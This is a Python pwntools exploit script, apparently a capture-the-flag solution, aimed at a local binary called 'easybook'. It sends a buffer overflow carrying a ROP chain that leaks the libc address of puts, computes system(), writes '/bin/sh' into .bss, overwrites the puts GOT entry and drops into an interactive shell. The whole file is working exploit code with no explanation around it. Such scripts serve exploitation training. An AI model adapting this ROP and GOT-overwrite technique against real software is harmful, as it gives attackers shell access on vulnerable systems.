#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-12-05 22:57:51
# @Author  : giantbranch (giantbranch@gmail.com)
# @Link    : http://www.giantbranch.cn/
# @tags : 

from pwn import *
# context.log_level = "debug"
p = process("./easybook")
elf = ELF("./easybook")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def getpid():
	print proc.pidof(p)[0]
	pause()


# 0x0000000000400c93 : pop rdi ; ret
# 0x0000000000400c91 : pop rsi ; pop r15 ; ret
pop_rdi_ret = 0x0000000000400c93
pop_rsi_pop_ret = 0x0000000000400c91

p.recvuntil("your name:\n")
setbuf_got = elf.got["setvbuf"]
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
read_plt = elf.plt["read"]
bss_addr = 0x602070
# read(0, bss, size)
payload = "A" * 56 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_pop_ret) + p64(bss_addr) + p64(0) + p64(read_plt)
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_pop_ret) + p64(puts_got) + p64(0) + p64(read_plt)
payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(puts_plt)

p.sendline(payload)

p.recvuntil("Your choice:\n")
p.sendline("4")

puts_got = u64(p.recvuntil("\n")[:-1].ljust(8 , "\x00"))
print "puts_got = " + hex(puts_got)
# 计算system和/bin/sh的地址
print "\ncalculating system() addr ... ###"
system_addr = puts_got - (libc.symbols['puts'] - libc.symbols['system'])
print "system_addr = " + hex(system_addr)

p.send("/bin/sh\x00")
sleep(1)
p.send(p64(system_addr)[:7])

p.interactive()

